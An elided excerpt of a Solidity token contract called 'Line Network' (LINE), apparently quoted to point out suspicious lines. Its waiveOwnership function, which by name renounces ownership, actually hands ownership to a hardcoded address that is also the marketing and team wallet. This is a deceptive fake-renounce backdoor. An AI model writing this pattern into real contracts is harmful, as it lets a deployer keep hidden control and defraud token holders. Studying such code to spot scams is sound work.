...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xb0dB80010455BdDF3e7504Df94a86e1D0e708BE0);
    }
...
contract LineNetwork is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Line Network";
    string private _symbol = "LINE";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xb0dB80010455BdDF3e7504Df94a86e1D0e708BE0);
    address payable public teamWalletAddress = payable(0xb0dB80010455BdDF3e7504Df94a86e1D0e708BE0);
